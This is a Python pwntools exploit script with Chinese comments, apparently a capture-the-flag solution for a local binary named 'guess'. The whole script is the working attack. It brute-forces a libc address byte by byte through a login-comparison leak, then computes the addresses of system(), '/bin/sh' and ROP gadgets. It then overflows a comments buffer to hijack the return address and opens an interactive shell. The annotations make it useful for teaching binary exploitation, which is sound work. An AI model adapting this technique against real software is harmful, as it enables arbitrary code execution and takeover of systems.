from pwn import *

# 使用pwn中的工具创建进程打开程序，并可以进行交互
io = process('./guess')

# 使用pwn中的工具查看libc.so由此可以在之后获取我们需要的信息
# /lib/x86_64-linux-gnu/libc.so.6 地址由命令行指令 ldd guess 可以得到
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

prebytes=b'' # 用于存储已经猜对的字节
stderr_addr=0 # 用于存储libc中stderr的基地址

for i in range(6): # x86-64中虚拟地址实际上只有48位，所以只需要枚举6次，每次8位(注意x86-64为小端序)
    for j in range(1, 256): # 枚举当前字节的值，为0x01~0xff(我们必须假设当前字节不为0x00，因为0x00是字符串结束符)
        
        # sendlineafter(magic,string)：在接收到magic后，发送string及换行符
        # b'xxx'表示将xxx转换为bytes类型,bytes类型和str类型类似，一个是字节串(bytes)，一个是字符串(str)
        # bytes 只负责以字节序列的形式（二进制形式）来存储数据，主要用于网络传输和二进制文件；str主要用于显示
        io.sendlineafter(b'Choice:', b'1')  # 接收到"Choice:"之后，发送"1"并换行

        account =  b'aaaaaaaaaaaaaaaa' 
        password = b'aaaaaaaaaaaaaaaa' # 令account和password前16字节均相等
        account = account + prebytes + bytes([j]) # account后半段为已经猜对的字节+当前枚举的字节
        
        # sendafter(magic,string)：接收到magic后，发送string
        io.sendafter(b'Account:', account)
        io.sendafter(b'Password:', password)
        # recvuntil(string)：接收到string后停止接收
        ret = io.recvuntil(b'l') # 接收到 `l` 之后，停止接收
        if (ret != b' Login fail'): # 如果接收到的不是 ` Login fail`，则说明猜对了；否则继续枚举，直到猜对为止
            stderr_addr = j * (256 ** i) + stderr_addr # 计算libc中stderr的地址(注意x86-64是小端序)
            prebytes += bytes([j]) # 将当前枚举的字节加入已猜对的字节中
            if i != 5:
                io.sendlineafter(b'comments:', b'') # 发送空行，退出登录回到主页面
            break

print("stderr_addr: ", hex(stderr_addr))


# 通过stderr_addr计算libc中system()的地址
# libc.symbols为字典类型(例如{aa,bb,cc}),记录了libc中各个函数的地址
system_addr = stderr_addr + libc.symbols["system"] - libc.symbols["_IO_2_1_stderr_"]
print("system_addr: ", hex(system_addr))

# 通过stderr_addr计算libc中"/bin/sh"字符串的地址
# 0x00000000001b45bd通过 ./ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh" 得到
bin_sh_addr = stderr_addr - libc.symbols["_IO_2_1_stderr_"] + 0x00000000001b45bd
print("bin_sh_addr: ", hex(bin_sh_addr))

# gadget1: pop $rdi; ret
# 通过stderr_addr计算libc中gadget1的地址
# 0x0000000000023b6a通过 ./ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" 得到
gadget1_addr = stderr_addr - libc.symbols["_IO_2_1_stderr_"] + 0x0000000000023b6a
print("gadget1_addr: ", hex(gadget1_addr))

# gadget2: ret
# 通过stderr_addr计算libc中gadget2的地址
# 0x0000000000022679 通过 ./ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "ret" 得到
gadget2_addr = stderr_addr - libc.symbols["_IO_2_1_stderr_"] + 0x0000000000022679
print("gadget2_addr: ", hex(gadget2_addr))

# 先随便输入64位
# 接下来输入的一个字节是对i的修改(注意x86-64是小端序，而i本来是64，高24位都为0，所以这里修改最低1字节为0x57，即为把i修改为0x57)
# 注意0x57为0x58-1(因为接下来i会+1)
# 此时的位置即为记录函数要返回的pc的位置，我们把它修改成gadget1_addr，再把下一位置修改成bin_sh_addr，即实现了把rdi修改成bin_sh_addr
# 再把下一位置修改成gadget2_addr，这里gadget2_addr相当于什么都没做，它的目的是为了使rsp+8，能够16位对齐
# 再把下一位置修改成system_addr，即完成进入system()的过程，由此我们实现了在./guess中调用system("/bin/sh")，打开了sh
# 最后再输入一个换行符(ascii为10)，使得sub_91A()中的循环能够退出，这样才能在sub_91A() return语句之后进入gadget1_addr
# 注：p64(x)：将x转换为64位的bytes类型(x86中为小端序)
comments = b'a' * 64 + bytes([0x57]) + p64(gadget1_addr) + p64(bin_sh_addr) + p64(gadget2_addr) + p64(system_addr) + b'\x0a'

io.sendafter(b'comments:', comments) # 发送comments，退出登录回到主页面


# interactive()：进入交互模式，可以输入命令，即将程序的输入输出改为终端的输入输出
io.interactive() # 此时我们已经成功的在./guess中打开了sh，可以进行交互了，于是我们把交互模式交给用户
